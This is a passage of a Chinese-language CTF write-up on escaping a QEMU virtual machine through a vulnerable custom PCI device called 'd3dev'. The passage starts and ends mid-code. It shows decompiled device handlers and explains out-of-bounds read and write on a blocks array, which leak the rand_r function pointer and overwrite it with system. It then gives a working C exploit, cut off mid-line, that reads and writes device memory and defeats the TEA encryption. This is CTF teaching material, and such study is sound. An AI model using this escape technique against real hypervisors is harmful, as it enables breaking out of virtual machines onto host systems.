class="type">unsigned</span> <span class="type">int</span>)(addr &gt;&gt; <span class="number">3</span>)];</span><br><span class="line">  v4 = <span class="number">-957401312</span>;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  result = HIDWORD(v3);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(result) = result - ((v5 + v4) ^ (opaque-&gt;key[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">2</span>] + <span class="number">16</span> * v5));</span><br><span class="line">    v5 -= (result + v4) ^ (opaque-&gt;key[<span class="number">1</span>] + ((<span class="type">unsigned</span> <span class="type">int</span>)result &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">0</span>] + <span class="number">16</span> * result);</span><br><span class="line">    v4 += <span class="number">1640531527</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 );</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;mmio_read_part )</span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> v5;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="d3dev-mmio-write"><a href="#d3dev-mmio-write" class="headerlink" title="d3dev_mmio_write"></a>d3dev_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">d3dev_mmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  ObjectClass_0 **v5; <span class="comment">// r11</span></span><br><span class="line">  <span class="type">uint64_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">uint32_t</span> v8; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">uint32_t</span> v9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">uint32_t</span> v10; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">uint32_t</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">uint64_t</span> v13; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = opaque-&gt;seek + (<span class="type">unsigned</span> <span class="type">int</span>)(addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;mmio_write_part )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;</span><br><span class="line">      v6 = val &lt;&lt; <span class="number">32</span>;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">      v8 = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      v9 = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      v10 = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      v11 = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      v12 = v6 + *((_DWORD *)v5 + <span class="number">694</span>);</span><br><span class="line">      v13 = ((<span class="type">unsigned</span> __int64)v5[<span class="number">347</span>] + v6) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 -= <span class="number">1640531527</span>;</span><br><span class="line">        v12 += (v7 + v13) ^ (v9 + ((<span class="type">unsigned</span> <span class="type">int</span>)v13 &gt;&gt; <span class="number">5</span>)) ^ (v8 + <span class="number">16</span> * v13);</span><br><span class="line">        LODWORD(v13) = ((v7 + v12) ^ (v11 + (v12 &gt;&gt; <span class="number">5</span>)) ^ (v10 + <span class="number">16</span> * v12)) + v13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != <span class="number">-957401312</span> );</span><br><span class="line">      v5[<span class="number">347</span>] = (ObjectClass_0 *)__PAIR64__(v13, v12);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;blocks[v4] = (<span class="type">unsigned</span> <span class="type">int</span>)val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="d3dev-pmio-read"><a href="#d3dev-pmio-read" class="headerlink" title="d3dev_pmio_read"></a>d3dev_pmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">d3dev_pmio_read</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">      result = opaque-&gt;memory_mode;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8uLL</span>:</span><br><span class="line">      result = opaque-&gt;seek;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xC</span>uLL:</span><br><span class="line">      result = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>uLL:</span><br><span class="line">      result = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x14</span>uLL:</span><br><span class="line">      result = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x18</span>uLL:</span><br><span class="line">      result = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = <span class="number">-1LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="d3dev-pmio-write"><a href="#d3dev-pmio-write" class="headerlink" title="d3dev_pmio_write"></a>d3dev_pmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">d3dev_pmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint32_t</span> *key; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( val &lt;= <span class="number">0x100</span> )</span><br><span class="line">      opaque-&gt;seek = val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">28</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      key = opaque-&gt;key;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        *key++ = ((__int64 (__fastcall *)(<span class="type">uint32_t</span> *, __int64, <span class="type">uint64_t</span>, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                   &amp;opaque-&gt;r_seed,</span><br><span class="line">                   <span class="number">28LL</span>,</span><br><span class="line">                   val,</span><br><span class="line">                   *(_QWORD *)&amp;size);</span><br><span class="line">      <span class="keyword">while</span> ( key != (<span class="type">uint32_t</span> *)&amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)opaque-&gt;key = <span class="number">0LL</span>;</span><br><span class="line">      *(_QWORD *)&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>可以看到在<code>d3dev_mmio_read</code>函数和<code>d3dev_mmio_write</code>函数中对数据进行了<code>tea</code>加密，而在<code>d3dev_pmio_write</code>函数中有如下代码可以令<code>key</code>的值为<code>0</code>，方便了我们进行加解密</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr == <span class="number">4</span> )&#123;</span><br><span class="line">  *(_QWORD *)opaque-&gt;key = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>d3dev_mmio_read</code>函数中有以下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = opaque-&gt;blocks[opaque-&gt;seek + (<span class="type">unsigned</span> <span class="type">int</span>)(addr &gt;&gt; <span class="number">3</span>)];</span><br></pre></td></tr></table></figure>
<p>可以看见程序并没有对<code>addr</code>的合法性进行检测，导致我们可以对数据进行越界读<br>在<code>d3dev_mmio_write</code>函数中存在以下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v4 = opaque-&gt;seek + (<span class="type">unsigned</span> <span class="type">int</span>)(addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">........</span><br><span class="line"></span><br><span class="line">opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">opaque-&gt;blocks[v4] = (<span class="type">unsigned</span> <span class="type">int</span>)val;</span><br></pre></td></tr></table></figure>
<p>和上面一样的问题，我们可以对该数组越界写<br>再看<code>d3dev_pmio_write</code>函数中的以下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr == <span class="number">28</span> )&#123;</span><br><span class="line">  opaque-&gt;r_seed = val;</span><br><span class="line">  key = opaque-&gt;key;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    *key++ = ((__int64 (__fastcall *)(<span class="type">uint32_t</span> *, __int64, <span class="type">uint64_t</span>, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                &amp;opaque-&gt;r_seed,</span><br><span class="line">                <span class="number">28LL</span>,</span><br><span class="line">                val,</span><br><span class="line">                *(_QWORD *)&amp;size);</span><br><span class="line">  <span class="keyword">while</span> ( key != (<span class="type">uint32_t</span> *)&amp;opaque-&gt;rand_r );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这个地方调用了函数指针<code>opaque-&gt;rand_r</code>，其第一个参数为<code>&amp;opaque-&gt;r_seed</code>，该参数在下面的代码片段中可控</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr == <span class="number">28</span> )&#123;</span><br><span class="line">  opaque-&gt;r_seed = val;</span><br></pre></td></tr></table></figure>
<p>最后再看看<code>d3devState</code>结构体：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00000000 d3devState struc ; (sizeof=0x1300, align=0x10, copyof_4545)</span><br><span class="line">00000000 pdev PCIDevice_0 ?</span><br><span class="line">000008E0 mmio MemoryRegion_0 ?</span><br><span class="line">000009D0 pmio MemoryRegion_0 ?</span><br><span class="line">00000AC0 memory_mode dd ?</span><br><span class="line">00000AC4 seek dd ?</span><br><span class="line">00000AC8 init_flag dd ?</span><br><span class="line">00000ACC mmio_read_part dd ?</span><br><span class="line">00000AD0 mmio_write_part dd ?</span><br><span class="line">00000AD4 r_seed dd ?</span><br><span class="line">00000AD8 blocks dq 257 dup(?)</span><br><span class="line">000012E0 key dd 4 dup(?)</span><br><span class="line">000012F0 rand_r dq ?                             ; offset</span><br><span class="line">000012F8 db ? ; undefined</span><br><span class="line">000012F9 db ? ; undefined</span><br><span class="line">000012FA db ? ; undefined</span><br><span class="line">000012FB db ? ; undefined</span><br><span class="line">000012FC db ? ; undefined</span><br><span class="line">000012FD db ? ; undefined</span><br><span class="line">000012FE db ? ; undefined</span><br><span class="line">000012FF db ? ; undefined</span><br><span class="line">00001300 d3devState ends</span><br></pre></td></tr></table></figure>
<p>现在思路就很明显了，可以通过数组越界读读取<code>rand_r</code>出原有的函数指针来泄露地址，然后在利用数组越界写来修改<code>rand_r</code>处的函数指针为<code>system</code>，最后修改<code>r_seed</code>为参数即可完成逃逸<br>这里有一个需要注意的点，我们在<code>exp</code>中访问<code>PCI</code>设备的<code>MMIO</code>空间使用的是<code>&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</code> 而不是平时的 <code>&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</code>。经过学习后我才发现原来这个并不是固定值<br>我们首先查看<code>d3dev_class_init</code>函数并将<code>v2</code>变量设置为<code>PCIDeviceClass</code>类型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">d3dev_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">  PCIDeviceClass *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           a1,</span><br><span class="line">                           (<span class="type">const</span> <span class="type">char</span> *)&amp;env.tlb_table[<span class="number">1</span>][<span class="number">115</span>]._anon_0.dummy[<span class="number">31</span>],</span><br><span class="line">                           <span class="string">&quot;/home/eqqie/CTF/qemu-escape/qemu-source/qemu-3.1.0/hw/misc/d3dev.c&quot;</span>,</span><br><span class="line">                           <span class="number">229</span>,</span><br><span class="line">                           <span class="string">&quot;d3dev_class_init&quot;</span>);</span><br><span class="line">  v2-&gt;realize = pci_d3dev_realize;</span><br><span class="line">  v2-&gt;<span class="built_in">exit</span> = <span class="number">0LL</span>;</span><br><span class="line">  *(_DWORD *)&amp;v2-&gt;vendor_id = <span class="number">0x11E82333</span>;</span><br><span class="line">  v2-&gt;revision = <span class="number">0x10</span>;</span><br><span class="line">  v2-&gt;class_id = <span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后在命令行中输入<code>lspci</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ # lspci</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 0200: 8086:100e</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 00ff: 2333:11e8</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br></pre></td></tr></table></figure>
<p>我们即可通过<code>class_id</code>和<code>vendor_id</code>来找到我们所需要的<code>PCI</code>设备</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val)</span>&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(addr+mmio_mem)) = val;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint64_t</span>*)(addr+mmio_mem));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint32_t</span> pmio_base = <span class="number">0xc040</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint64_t</span>)inl(pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> val)</span>&#123;</span><br><span class="line">    outl(val,addr+pmio_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">en</span><span class="params">(<span class="type">uint32_t</span> high,<span class="type">uint32_t</span> low)</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0xC6EF3720</span>;</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9E3779b9</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">        high -= (low*<span class="number">16</span>) ^ (low+sum) ^ (low&gt;&gt;<span class="number">5</span>);</span><br><span class="line">        low -= (high*<span class="number">16</span>) ^ (high+sum) ^ (high&gt;&gt;<span class="number">5</span>);</span><br><span class="line">        sum += <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint64_t</span>)high * <span class="number">0x100000000</span> + low;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">de</span><span class="params">(<span class="type">uint32_t</span> high,<span class="type">uint32_t</span> low)</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9E3779b9</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">        sum -= <span class="number">0x61C88647</span>;</span><br><span class="line">        low += (high*<span class="number">16</span>) ^ (high+sum) ^ (high&gt;&gt;<span class="number">5</span>);</span><br><span class="line">        high += (low*<span class="number">16</span>) ^ (low+sum) ^ (low&gt;&gt;<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint64_t</span>)high * <span class="number">0x100000000</span> + low;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)&#123;</span><br><span class="line">    perror(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)&#123;</span><br><span class="line">      perror(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line">	  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )&#123;</span><br><span class="line">        perror(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0x100</span>); <span class="comment">// opaque-&gt;seek = 0x100</span></span><br><span class="line">    pmio_write(<span class="number">4</span>,<span class="number">0</span>); <span class="comment">// 令key为0 方便tea加解密</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> rand_r = mmio_read(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;region rand_r: %p\n&quot;</span>,rand_r);</span><br><span class="line">    <span class="type">uint64_t</span> randr = de(rand_r/<span class="number">0x100000000</span>,rand_r%<span class="number">0x100000000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;encode randr: %p\n&quot;</span>,randr);</span><br><span class="line">    <span class="type">uint64_t</span> system = randr + <span class="number">0xa5f0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system: %p\n&quot;</span>, system);</span><br><span class="line">    <span class="type">uint64_t</span> encode_system = en(system / <span class="number">0x100000000</span>, system % <span class="number">0x100000000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;encode system: %p\n&quot;</span>, encode_system);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在rand_r写入system</span></span><br><span class="line">    mmio_write(<span class="number">24</span>,encode_system%<span class="number">0x100000000</span>); <span class="comment">//只能4字节4字节的写入</span></span><br><span class="line">    mmio_write(<span class="number">24</span>,encode_system/<span class="number">0x100000000</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span 